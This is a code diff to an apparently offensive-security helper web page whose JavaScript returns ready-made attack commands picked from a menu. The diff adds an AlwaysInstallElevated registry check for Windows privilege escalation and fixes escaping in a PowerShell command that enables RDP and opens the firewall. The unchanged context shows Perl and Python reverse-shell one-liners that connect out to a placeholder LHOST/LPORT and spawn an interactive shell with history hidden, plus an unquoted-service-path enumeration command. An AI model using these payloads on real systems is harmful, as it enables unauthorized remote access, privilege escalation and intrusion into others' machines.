@@ -297,6 +297,7 @@ if (language) {
   <option value="Binary encoding">
   <option value="Binary decoding">
   <option value="Brainfuck interpreter">
+  <option value="Cmd: Check AlwaysInstallElevated">
   <option value="Cmd: Check unquoted services">
   <option value="Decimal ASCII encoding">
   <option value="Decimal ASCII decoding">
@@ -337,6 +338,7 @@ $(function () {
   functions["Binary decoding"] = function (input) { return input.replace(/[01]{8}/g, function(v){ 
   return String.fromCharCode(parseInt(v, 2)); }); }
   functions["Brainfuck interpreter"] = function (input) { return brainfuck(input); }
+  functions["Cmd: Check AlwaysInstallElevated"] = function (input) { return "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"; }
   functions["Cmd: Check unquoted services"] = function (input) { return 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'; }
   functions["Decimal ASCII encoding"] = function (input) { function ascii_enc (a) { return a.charCodeAt(0); } return input.split('').map(ascii_enc); }
   functions["Decimal ASCII decoding"] = function (input) { function ascii_dec (a) { return String.fromCharCode(a); } return input.split(',').map(ascii_dec).join(''); }
@@ -344,7 +346,7 @@ $(function () {
   functions["Morse code encoding"] = function (input) { return MorseCode.encode(input); }
   functions["Morse code decoding"] = function (input) { return MorseCode.decode(input); }
   functions["Perl TCP reverse shell"] = function (input) { return apply_2args('perl -e \x27use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\x27', "LHOST", "LPORT", input); }
-  functions["Powershell: Enable RDP access"] = function (input) { return 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop";'; }
+  functions["Powershell: Enable RDP access"] = function (input) { return 'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop";'; }
   functions["Powershell: Base64 to file"] = function (input) { return apply_2args("[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($base64string));", "$filename", "$base64string", "'"+input.split(":").join("':'")+"'"); }
   functions["Powershell: File to base64"] = function (input) { return apply_arg("[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename));", "$filename", "'"+input+"'"); }
   functions["Python STCP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"', "LHOST", "LPORT", input); }
@@ -357,16 +359,6 @@ $(function () {
   functions["URL encoding (minimum)"] = function (input) { return encodeURI(input); }
   functions["URL encoding (medium)"] = function (input) { return encodeURIComponent(input); }
   functions["URL decoding"] = function (input) { return decodeURIComponent(input); }
-
-
-
-
-
-
-
-  
-
-
 
   $("input:text").focus(function(){ $(this).val(''); });
   $("input:text").click(function(){ $(this).val(''); });
